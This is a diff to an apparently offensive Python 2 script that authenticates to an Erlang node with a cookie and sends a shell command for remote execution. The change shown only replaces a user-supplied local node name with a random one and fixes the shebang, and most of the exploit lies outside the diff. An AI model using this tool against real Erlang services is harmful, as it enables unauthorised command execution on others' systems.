@@ -1,4 +1,4 @@
-#!/usr/bin/env python
+#!/usr/bin/env python2
 
 from struct import pack, unpack
 from cStringIO import StringIO
@@ -19,13 +19,10 @@ parser.add_argument('target', action='store', type=str, help='Erlang node addres
 parser.add_argument('port', action='store', type=int, help='Erlang node TCP port')
 parser.add_argument('cookie', action='store', type=str, help='Erlang cookie')
 parser.add_argument('cmd', action='store', type=str, help='Shell command to execute')
-parser.add_argument('name', action='store', dest='name', help='Local Erlang node, default to 6 random ASCII uppercase letters')
 
 args = parser.parse_args()
 
-if args.name is None:
-  args.name = rand_id()
-
+name = rand_id()
 
 sock = socket(AF_INET, SOCK_STREAM, 0)
 assert(sock)
@@ -35,7 +32,7 @@ sock.connect((args.target, args.port))
 def send_name(name):
   return pack('!HcHI', 7 + len(name), 'n', 5, 0x3499c) + name
 
-sock.sendall(send_name(args.name))
+sock.sendall(send_name(name))
 
 
 data = sock.recv(5)
@@ -95,7 +92,7 @@ def hexdump(src, length=16):
         lines.append("%04x  %-*s  %s\n" % (c, length*3, hex, printable))
     return ''.join(lines)
 
-sock.sendall(send_cmd(args.name, args.cmd))
+sock.sendall(send_cmd(name, args.cmd))
 
 def recv_reply(f):
   data = f.recv(4)
